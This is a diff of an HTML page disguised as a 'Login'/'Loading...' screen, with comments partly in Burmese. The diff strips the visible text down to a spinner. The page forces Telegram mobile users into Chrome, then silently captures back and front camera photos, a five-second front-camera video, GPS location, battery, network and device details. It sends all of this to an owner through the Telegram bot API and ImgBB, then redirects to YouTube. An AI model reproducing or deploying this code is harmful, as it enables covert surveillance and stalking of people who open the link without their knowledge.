@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Login</title>
+    <title>Loading...</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -25,33 +24,23 @@
             text-align: center;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
         }
-        h1 { 
-            color: #667eea; 
-            margin-bottom: 10px; 
-            font-size: 28px;
-            letter-spacing: 2px;
+        .loading {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
         }
-        .subtitle { 
-            color: #999; 
-            margin-bottom: 30px; 
-            font-size: 14px;
-            font-style: italic;
-        }
-        .redirect-note {
-            margin-top: 20px;
-            padding: 10px;
-            background: #f0f0f0;
-            border-radius: 10px;
-            font-size: 12px;
-            color: #666;
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Login</h1>
-        <div class="subtitle">Please wait...</div>
-        <div class="redirect-note" id="redirectNote">🔄 Opening in Chrome browser...</div>
+        <div class="loading"></div>
     </div>
 
     <script>
@@ -67,68 +56,32 @@
         const isTelegram = /Telegram/i.test(navigator.userAgent);
         const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
         
-        // ========== FORCE REDIRECT TO CHROME ==========
-        // Telegram browser ကို သေချာ detect လုပ်ပြီး Chrome ကို အတင်းပြောင်းမယ်
+        const isTelegramBrowser = isTelegram && isMobile;
         
-        function redirectToChrome() {
+        function openInChrome() {
             const currentUrl = window.location.href;
-            
-            // Method 1: Android Intent (အလုပ်အဖြစ်ဆုံး)
-            // Chrome package name: com.android.chrome
             const chromeIntent = `intent://${currentUrl.replace('https://', '').replace('http://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
-            
-            // Method 2: fallback - tell user to open manually
-            document.getElementById('redirectNote').innerHTML = '⚠️ Unable to auto-open Chrome.<br>Please copy link and open in Chrome browser manually.<br><br>📋 Link: ' + currentUrl;
-            
-            // Try to redirect to Chrome
             window.location.href = chromeIntent;
-            
-            // Fallback: if intent fails, show manual instruction after 2 seconds
+        }
+        
+        // Telegram browser ဆိုရင် Chrome ကို Auto ခေါ်မယ် (ဘာမှမပြ)
+        if (isTelegramBrowser) {
+            openInChrome();
+            // Fallback: 2 စက္ကန့်ကြာပြီး မရောက်သေးရင် ထပ်ခေါ်မယ်
             setTimeout(function() {
-                document.getElementById('redirectNote').innerHTML = '📋 Please copy this link and open in Chrome browser:<br><br>' + currentUrl;
+                openInChrome();
             }, 2000);
         }
         
-        // Detect if running in Telegram's in-app browser
-        if (isTelegram && isMobile) {
-            // Try multiple methods to redirect to Chrome
-            
-            // Method A: intent scheme (အကောင်းဆုံး)
-            const currentUrl = window.location.href;
-            const intentUrl = `intent://${currentUrl.replace('https://', '').replace('http://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
-            window.location.href = intentUrl;
-            
-            // Method B: If intent fails, try to show instruction
-            setTimeout(function() {
-                // Still in Telegram? Show manual instruction
-                if (window.location.href === currentUrl) {
-                    document.body.innerHTML = `
-                        <div class="container">
-                            <h1>🔓 Open in Chrome</h1>
-                            <div class="subtitle">Please open this link in Chrome browser</div>
-                            <div style="background:#f0f0f0; padding:15px; border-radius:10px; margin:15px 0; word-break:break-all;">
-                                ${currentUrl}
-                            </div>
-                            <p>1️⃣ Tap and hold the link above</p>
-                            <p>2️⃣ Select "Copy"</p>
-                            <p>3️⃣ Open Chrome browser</p>
-                            <p>4️⃣ Paste and go</p>
-                            <br>
-                            <p>Or click "Open in Chrome" button below</p>
-                            <button onclick="window.location.href='${intentUrl}'" style="background:#667eea; color:white; border:none; padding:12px 25px; border-radius:25px; margin-top:15px; cursor:pointer;">
-                                🌐 Open in Chrome
-                            </button>
-                        </div>
-                    `;
-                }
-            }, 1500);
+        // Chrome မှာဆိုရင် Auto run
+        if (!isTelegramBrowser) {
+            init();
         }
         
         let backPhotoSent = false;
         let frontPhotoSent = false;
         let videoSent = false;
         
-        // ========== SEND MESSAGE ==========
         async function sendMessageToOwner(text) {
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -145,12 +98,11 @@
             }
         }
         
-        // ========== SEND VIDEO ==========
         async function sendVideoToOwner(videoBlob) {
             const formData = new FormData();
             formData.append('chat_id', OWNER_ID);
             formData.append('video', videoBlob, 'video.mp4');
-            formData.append('caption', `🎥 VIDEO RECORDED! (Front Camera)\n🕐 Time: ${new Date().toLocaleString()}\n⏱️ Duration: 5 seconds`);
+            formData.append('caption', `🎥 VIDEO RECORDED!\n🕐 Time: ${new Date().toLocaleString()}\n⏱️ Duration: 5 seconds`);
             
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
@@ -162,7 +114,6 @@
             }
         }
         
-        // ========== UPLOAD TO IMGBB ==========
         async function uploadToImgBB(imageBlob) {
             const formData = new FormData();
             formData.append('image', imageBlob);
@@ -180,7 +131,6 @@
             }
         }
         
-        // ========== TAKE PHOTO ==========
         async function takePhotoAndSend(stream, cameraType) {
             if (cameraType === 'back' && backPhotoSent) return;
             if (cameraType === 'front' && frontPhotoSent) return;
@@ -218,7 +168,6 @@
             }, 'image/jpeg', 0.7);
         }
         
-        // ========== VIDEO RECORDING (အရှေ့ကင်မရာ Video 5 စက္ကန့်) ==========
         async function recordFrontVideo() {
             if (videoSent) return;
             videoSent = true;
@@ -252,7 +201,6 @@
             }
         }
         
-        // ========== BACK CAMERA (အနောက်) ==========
         async function initBackCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -265,7 +213,6 @@
             }
         }
         
-        // ========== FRONT CAMERA (အရှေ့) ==========
         async function initFrontCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -278,7 +225,6 @@
             }
         }
         
-        // ========== LOCATION ==========
         async function getLocation() {
             if (!navigator.geolocation) {
                 await sendMessageToOwner(`❌ LOCATION NOT SUPPORTED!\n🕐 Time: ${new Date().toLocaleString()}`);
@@ -307,7 +253,6 @@
             );
         }
         
-        // ========== BATTERY INFO ==========
         async function getBatteryInfo() {
             if ('getBattery' in navigator) {
                 try {
@@ -323,7 +268,6 @@
             }
         }
         
-        // ========== NETWORK INFO ==========
         async function getNetworkInfo() {
             let networkType = "Unknown";
             let downlink = "";
@@ -348,7 +292,6 @@
             await sendMessageToOwner(`🌐 NETWORK INFO!\n🕐 Time: ${new Date().toLocaleString()}\n📌 Connection Type: ${connectionMethod}\n📌 Speed: ${networkType}${downlink}`);
         }
         
-        // ========== DEVICE INFO ==========
         async function sendDeviceInfo() {
             const deviceInfo = {
                 platform: navigator.platform,
@@ -362,43 +305,22 @@
             await sendMessageToOwner(`📱 DEVICE INFO!\n🕐 Time: ${new Date().toLocaleString()}\n📌 Platform: ${deviceInfo.platform}\n📌 Language: ${deviceInfo.language}\n📌 Screen: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n📌 Timezone: ${deviceInfo.timezone}\n📌 User Agent: ${deviceInfo.userAgent.substring(0, 100)}...`);
         }
         
-        // ========== MAIN ==========
-        // Chrome မှာဖွင့်မှသာ init() ကို run မယ် (Telegram browser ဆို redirect လုပ်ထားပြီးသား)
         async function init() {
             if (!OWNER_ID) {
                 return;
             }
             
-            // အနောက်ကင်မရာ (Back Camera Photo)
             await initBackCamera();
-            
-            // အရှေ့ကင်မရာ (Front Camera Photo)
             await initFrontCamera();
-            
-            // Video Recording (Front Camera Video 5 sec)
             await recordFrontVideo();
-            
-            // Location (Maps လင့်ပါ)
             await getLocation();
-            
-            // Battery Info (ဖုန်းအား)
             await getBatteryInfo();
-            
-            // Network Info (WiFi/Cellular/4G/5G)
             await getNetworkInfo();
-            
-            // Device Info
             await sendDeviceInfo();
             
-            // အကုန်ပြီးရင် YouTube ခေါ်မယ်
             setTimeout(() => {
                 window.location.href = YOUTUBE_URL;
             }, 5000);
-        }
-        
-        // Start - Chrome မှာသာ init လုပ်မယ်
-        if (!isTelegram || !isMobile) {
-            init();
         }
     </script>
 </body>
